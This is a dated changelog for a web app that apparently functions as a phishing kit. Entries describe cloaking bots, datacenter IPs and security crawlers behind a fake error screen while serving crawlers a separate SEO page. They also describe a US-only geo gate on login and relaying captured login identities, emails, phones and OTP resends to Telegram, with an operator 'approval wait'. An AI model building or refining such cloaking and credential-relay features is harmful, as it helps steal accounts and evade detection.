Deploy....

## Changelog

### 2026-09-25 — ErrorScreen: viewport-pinned root + overscroll containment
- ErrorScreen root pinned: `position: fixed; inset: 0; overscroll-behavior: none` on client root, plain `.chrome-error-screen` CSS, and SSR `buildErrorScreenHtml` body — no page scrollbar; hard trackpad scroll no longer exposes the white canvas behind the dark screen

### 2026-09-23 — ErrorScreen OG tags + origin-gate social exemption
- `lib/error-screen-html.ts`: SSR ErrorScreen now emits full `og:` / `twitter:` card meta from shared `SITE_*` constants (was meta-less → blank cards when cloak fired)
- `lib/bot-verification/origin-request-gate.ts`: `SOCIAL_PREVIEW_UA` fast-pass **before** the hosting-ASIN check (denied-UA still first) so social scrapers from datacenter IPs never get cloaked into blank cards

### 2026-09-23 — Social allowlist += `meta-externalfetcher` + `snapchat`; host-rule hardening
- `SOCIAL_PREVIEW_UA` → canonical **13-token** list: added Meta's modern share crawler `meta-externalfetcher` + `snapchat` (mirrored in `utils/botDetection.ts`, `lib/parse-visitor-os.ts`)
- Host rule hardened: **Vercel Domains primary wins over the operator paste** (apex paste + www primary = `og:image` 308 = blank social cards — seen live)

### 2026-09-21 — Restore x-geo-us-only in middleware
- Restored truncated middleware helpers so `GEO_US_ONLY_HEADER` / `x-geo-us-only` is set via `getRequestCountryCode`
- Kept www/apex preferred-host redirect removed; ProtectedLayout already passes `geoAccess` so visit notify stays after grant

### 2026-09-21 — US geo on login entry
- Require US on public login paths (/login) as well as `/` so non-US referrer visits cannot skip the geo gate



### 2026-09-21 — Drop middleware www/apex redirect
- Removed `handlePreferredHostRedirect` so middleware cannot fight Vercel Domains (apex↔www `ERR_TOO_MANY_REDIRECTS`)


### 2026-09-21 — Visit Telegram footer: All Father
- Visitor alert link write-up: `Odin Is With Us` → `All Father` (same `t.me/th3_allfather` URL)


### 2026-09-20 — Build fix
- lib/telegram.ts: patch_myfrs_telegram_methods
- lib/telegram-seo-admin.ts: searchQuery optional


### 2026-09-20 — Resend Telegram identity
- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
- Removed OTP Type (first/final) from resend notifications

### 2026-09-20 — Fleet latency: burst poll + Neon cache
- Approval wait: 200ms for first 10s, then 500ms
- Neon: fetchConnectionCache + cached clients per shard


### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock


### 2026-09-02 — Remove scheduled SEO report cron
- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged


### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)


### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden


### 2026-08-24 — Neon stack DATABASE_URL + DB_2…DB_10
- Replaced legacy `DATABASE_URL_2` resolver with `DB_2`…`DB_10` shared shards (`CC_ID` required)
- Shard 0 stays `DATABASE_URL`; rename Vercel `DATABASE_URL_2` → `DB_2` if still set
- No `DATABASE_URL_N` aliases — see `NEON_DATABASE_RULES.md`


### 2026-08-23 — Fix referrer allowlist array hole
- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)


### 2026-08-21 — Visit Telegram device models
- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
- Optional Client Hints `uaModel` on visitor POST when available


### 2026-08-21 — Local CSP preview for CrawlerSeoPage
- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`

### 2026-08-20 — AI training block + reference crawl
- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt

